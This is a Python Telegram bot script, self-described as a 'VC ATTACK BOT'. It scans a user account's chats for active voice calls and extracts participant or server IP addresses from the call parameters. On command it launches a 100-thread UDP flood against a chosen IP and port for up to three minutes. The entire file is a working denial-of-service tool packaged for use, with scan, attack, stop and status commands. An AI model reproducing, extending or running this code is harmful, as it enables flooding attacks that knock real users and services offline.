#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import logging
import asyncio
import socket
import time
import json
import re
import threading
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    format='[%(asctime)s] %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("BOT")

# ============================================================
# ENV VARIABLES
# ============================================================
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
SESSION_STRING = os.getenv("SESSION_STRING", "")

if not all([API_ID, API_HASH, BOT_TOKEN, SESSION_STRING]):
    logger.error("Missing: API_ID, API_HASH, BOT_TOKEN, SESSION_STRING")
    sys.exit(1)

# ============================================================
# IMPORTS
# ============================================================
try:
    from pyrogram import Client, filters
    from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
except ImportError:
    logger.error("Installing pyrogram...")
    os.system("pip install pyrogram==2.0.106 TgCrypto==1.2.3")
    sys.exit(1)

# ============================================================
# IP REGEX
# ============================================================
IPV4_RE = re.compile(r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b')

# ============================================================
# ATTACK ENGINE
# ============================================================
class AttackEngine:
    def __init__(self, threads=100):
        self.threads = threads
        self._stop = threading.Event()
        self.stats = {"sent": 0, "bytes": 0, "running": False}
        self._lock = threading.Lock()
        self._packets = [os.urandom(1400) for _ in range(200)]

    def stop(self):
        self._stop.set()
        self.stats["running"] = False

    def _send_worker(self, ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        idx = 0
        while not self._stop.is_set():
            try:
                payload = self._packets[idx % len(self._packets)]
                idx += 1
                sock.sendto(payload, (ip, port))
                with self._lock:
                    self.stats["sent"] += 1
                    self.stats["bytes"] += len(payload)
            except BlockingIOError:
                time.sleep(0.0001)
            except Exception:
                pass
        sock.close()

    async def start_attack(self, ip, port, duration):
        if self.stats["running"]:
            raise Exception("Already running")
        self._stop.clear()
        self.stats = {"sent": 0, "bytes": 0, "running": True}
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_worker, args=(ip, port), daemon=True)
            t.start()
            threads.append(t)
        await asyncio.sleep(duration)
        self._stop.set()
        for t in threads:
            t.join(timeout=0.3)
        self.stats["running"] = False
        return self.stats

    def get_stats(self):
        with self._lock:
            return self.stats.copy()

# ============================================================
# VC DETECTOR
# ============================================================
class VCDetector:
    def __init__(self, client):
        self.client = client

    async def scan_dialogs(self, limit=30):
        vcs = []
        try:
            async for dialog in self.client.get_dialogs(limit=limit):
                try:
                    chat = dialog.chat
                    if not chat:
                        continue
                    peer = await self.client.resolve_peer(chat.id)
                    call = None
                    try:
                        from pyrogram.raw.functions.channels import GetFullChannel
                        from pyrogram.raw.functions.messages import GetFullChat
                        from pyrogram.raw.types import InputChannel
                        if hasattr(peer, 'channel_id'):
                            full = await self.client.invoke(
                                GetFullChannel(channel=InputChannel(peer.channel_id, peer.access_hash))
                            )
                            call = getattr(full.full_chat, 'call', None)
                        elif hasattr(peer, 'chat_id'):
                            full = await self.client.invoke(GetFullChat(chat_id=peer.chat_id))
                            call = getattr(full.full_chat, 'call', None)
                    except:
                        pass
                    if call:
                        vcs.append({'id': chat.id, 'title': chat.title or str(chat.id), 'call': call})
                except:
                    continue
        except Exception as e:
            logger.error(f"Scan error: {e}")
        return vcs

    async def extract_ips(self, vc_data):
        call = vc_data['call']
        ips = []
        try:
            from pyrogram.raw.functions.phone import GetGroupCall
            from pyrogram.raw.types import InputGroupCall
            group = await self.client.invoke(
                GetGroupCall(call=InputGroupCall(call.id, call.access_hash), limit=200)
            )
            call_obj = getattr(group, 'call', None)
            if call_obj and hasattr(call_obj, 'params'):
                raw = getattr(call_obj.params, 'data', '{}')
                try:
                    data = json.loads(raw) if raw else {}
                except:
                    data = {}
                text = json.dumps(data)
                for ip in IPV4_RE.findall(text):
                    if ip not in ips:
                        ips.append(ip)
        except:
            pass
        return ips

# ============================================================
# MAIN BOT
# ============================================================
class VCBot:
    def __init__(self):
        self.bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
        self.user = Client("user", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
        self.detector = None
        self.engine = AttackEngine(threads=100)
        self.scanned_vcs = []
        self.target_ip = None
        self.target_port = 10001
        self.attack_running = False

    async def start(self):
        logger.info("🚀 Starting...")
        await self.bot.start()
        await self.user.start()
        self.detector = VCDetector(self.user)
        self.register_handlers()
        logger.info("✅ Bot Ready! Commands: /scan, /attack, /stop, /status")
        await asyncio.Future()

    def register_handlers(self):
        @self.bot.on_message(filters.command("start"))
        async def start_cmd(client, msg):
            await msg.reply_text(
                "🔥 **VC ATTACK BOT**\n\n"
                "/scan - Find voice chats\n"
                "/attack IP PORT [DURATION] - Attack\n"
                "/stop - Stop\n"
                "/status - Stats"
            )

        @self.bot.on_message(filters.command("scan"))
        async def scan_cmd(client, msg):
            if self.attack_running:
                await msg.reply("⛔ Attack running! Use /stop")
                return
            status = await msg.reply("🔍 Scanning...")
            try:
                self.scanned_vcs = await self.detector.scan_dialogs(limit=30)
                if not self.scanned_vcs:
                    await status.edit_text("❌ No voice chats found")
                    return
                buttons = []
                for i, vc in enumerate(self.scanned_vcs[:20]):
                    buttons.append([InlineKeyboardButton(
                        f"{i+1}. {vc['title'][:25]}",
                        callback_data=f"vc_{i}"
                    )])
                buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel")])
                await status.edit_text(
                    f"✅ Found {len(self.scanned_vcs)} VCs. Select:",
                    reply_markup=InlineKeyboardMarkup(buttons)
                )
            except Exception as e:
                await status.edit_text(f"❌ Error: {e}")

        @self.bot.on_message(filters.command("attack"))
        async def attack_cmd(client, msg):
            if self.attack_running:
                await msg.reply("⛔ Attack running! Use /stop")
                return
            parts = msg.text.split()
            if len(parts) < 3:
                await msg.reply("Usage: /attack IP PORT [DURATION]")
                return
            try:
                ip = parts[1]
                port = int(parts[2])
                dur = int(parts[3]) if len(parts) > 3 else 60
                dur = min(dur, 180)
                await self._execute_attack(msg.chat.id, ip, port, dur)
            except:
                await msg.reply("❌ Invalid input")

        @self.bot.on_message(filters.command("stop"))
        async def stop_cmd(client, msg):
            self.engine.stop()
            self.attack_running = False
            await msg.reply("🛑 Stopped")

        @self.bot.on_message(filters.command("status"))
        async def status_cmd(client, msg):
            stats = self.engine.get_stats()
            await msg.reply(
                f"📊 Running: {self.attack_running}\n"
                f"Packets: {stats['sent']}\n"
                f"Data: {self._human_bytes(stats['bytes'])}\n"
                f"Target: {self.target_ip}:{self.target_port}"
            )

        @self.bot.on_callback_query()
        async def cb_handler(client, cb):
            data = cb.data
            if data.startswith("vc_"):
                idx = int(data.split("_")[1])
                if idx >= len(self.scanned_vcs):
                    await cb.answer("Invalid")
                    return
                selected = self.scanned_vcs[idx]
                await cb.message.edit_text(f"⏳ Extracting IPs from {selected['title']}...")
                await cb.answer()
                try:
                    ips = await self.detector.extract_ips(selected)
                    if not ips:
                        await cb.message.edit_text("❌ No IPs found")
                        return
                    self.target_ip = ips[0]
                    self.target_port = 10001
                    await cb.message.edit_text(
                        f"✅ IP: {self.target_ip}:{self.target_port}\n"
                        f"Press /attack {self.target_ip} 10001 60",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🚀 Attack", callback_data="attack_now")]
                        ])
                    )
                except Exception as e:
                    await cb.message.edit_text(f"❌ Error: {e}")
            elif data == "attack_now":
                await cb.answer("Launching...")
                await self._execute_attack(cb.message.chat.id, self.target_ip, self.target_port, 60)
            elif data == "cancel":
                await cb.message.edit_text("❌ Cancelled")
                await cb.answer()

    async def _execute_attack(self, chat_id, ip, port, duration):
        if self.attack_running:
            return
        self.attack_running = True
        self.target_ip = ip
        self.target_port = port
        status = await self.bot.send_message(chat_id, f"🔥 Attacking {ip}:{port} ({duration}s)")
        try:
            stats = await self.engine.start_attack(ip, port, duration)
            await status.edit_text(
                f"✅ Complete!\n"
                f"Packets: {stats['sent']}\n"
                f"Data: {self._human_bytes(stats['bytes'])}"
            )
        except Exception as e:
            await status.edit_text(f"❌ Error: {e}")
        finally:
            self.attack_running = False

    @staticmethod
    def _human_bytes(b):
        for unit in ["B", "KB", "MB", "GB"]:
            if b < 1024.0:
                return f"{b:.1f} {unit}"
            b /= 1024.0
        return f"{b:.1f} TB"

# ============================================================
# HEALTH CHECK
# ============================================================
def health_server():
    try:
        import http.server, socketserver
        class H(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
        port = int(os.getenv("PORT", 8080))
        with socketserver.TCPServer(("0.0.0.0", port), H) as httpd:
            httpd.serve_forever()
    except:
        pass

# ============================================================
# MAIN
# ============================================================
async def main():
    threading.Thread(target=health_server, daemon=True).start()
    bot = VCBot()
    try:
        await bot.start()
    except Exception as e:
        logger.error(f"Fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
